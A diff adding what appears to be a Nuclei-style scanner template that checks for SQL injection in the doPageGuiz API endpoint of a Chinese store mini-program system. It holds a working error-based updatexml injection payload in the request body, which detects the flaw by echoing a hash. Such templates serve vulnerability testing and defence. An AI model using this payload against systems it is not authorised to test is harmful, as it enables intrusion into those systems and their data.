@@ -1,0 +1,34 @@
+id: poc-yaml-internet-wxapps-dopageguiz-sqli
+info:
+  name: 万能门店小程序系统 doPageGuiz SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability in 万能门店小程序系统 doPageGuiz endpoint.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: POST
+    path:
+      - /api/wxapps/doPageGuiz
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: suid=1&uniacid=1 and updatexml(1,concat(0x7e,(select md5('{{t1}}')),0x7e),1)--+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQLSTATE[HY000]"
+          - "XPATH syntax error"
+      - type: word
+        words:
+          - "{{substr(t2, 0, 31)}}"
+      - type: word
+        negative: true
+        words:
+          - "<"
+    stop-at-first-match: true
